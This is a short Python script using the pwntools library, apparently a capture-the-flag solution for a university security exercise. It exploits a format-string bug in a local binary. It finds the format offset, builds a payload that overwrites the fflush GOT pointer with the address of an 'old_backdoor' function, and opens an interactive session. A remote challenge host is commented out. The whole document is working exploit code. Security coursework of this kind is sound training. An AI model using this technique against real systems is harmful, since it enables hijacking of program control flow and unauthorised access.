from pwn import *

def exec_format(payload):
    p = process("./program")
    p.recvuntil(b'...')
    p.sendline(payload)
    output = p.recvall()
    p.kill()
    return output

context.binary = "./program"

elf = ELF("./program")
fflush_ptr = 0x804c010
backdoor_addr = elf.symbols["old_backdoor"]

print("fflush_addr:", hex(fflush_ptr))
print("backdoor_addr:", hex(backdoor_addr))

autofmt = FmtStr(exec_format)

offset = autofmt.offset
print(f"Offset: {offset:#04x}")

writes = { fflush_ptr: backdoor_addr }
print(f"Writes: {writes}")

payload = fmtstr_payload(offset, writes)
print("Payload:", payload)
print("Payload length:", len(payload))

# p = remote("ctf-fsi.fe.up.pt", 4007)
p = process("./program")
p.recvuntil(b'...')
p.sendline(payload)
p.interactive()
